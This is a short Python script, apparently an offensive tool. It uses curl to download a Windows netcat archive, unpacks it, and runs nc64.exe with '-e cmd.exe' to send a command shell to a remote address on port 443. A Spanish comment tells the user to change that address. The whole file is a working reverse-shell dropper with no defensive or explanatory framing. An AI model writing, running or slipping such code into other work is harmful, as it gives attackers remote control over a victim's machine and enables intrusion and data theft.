import os
import shutil


os.system("curl https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -o arch385839.zip")
shutil.unpack_archive("arch385839.zip")
os.chdir("netcat-1.11")
#cambia la esto       debajo
os.system("nc64.exe 192.160.0.0 443 -e cmd.exe")
